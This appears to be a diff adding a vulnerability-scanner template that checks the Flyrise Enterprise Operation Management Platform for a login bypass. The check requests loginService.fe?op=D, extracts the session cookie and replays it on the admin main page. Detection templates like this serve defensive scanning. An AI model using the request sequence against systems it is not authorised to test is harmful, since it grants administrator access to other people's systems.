@@ -1,0 +1,50 @@
+id: flyrise-enterprise-login-bypass
+info:
+  name: Flyrise Enterprise Operation Management Platform Login Bypass
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The Flyrise Enterprise Operation Management Platform is vulnerable to a login bypass vulnerability via the loginService.fe endpoint.
+  tags: auth-bypass
+
+flow: http(1) && http(2)
+
+http:
+  - id: extract-cookie
+    method: GET
+    path:
+      - "{{BaseURL}}/loginService.fe?op=D"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: header
+        regex:
+          - "JSESSIONID=(.*?);"
+    extractors:
+      - type: regex
+        name: jsessionid
+        part: header
+        internal: true
+        regex:
+          - "JSESSIONID=(.*?);"
+
+  - id: validate-bypass
+    method: GET
+    path:
+      - "{{BaseURL}}/main/main.jsp"
+    headers:
+      Cookie: JSESSIONID={{jsessionid}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "超级管理员"
+          - "岗位管理"
+          - "退出"
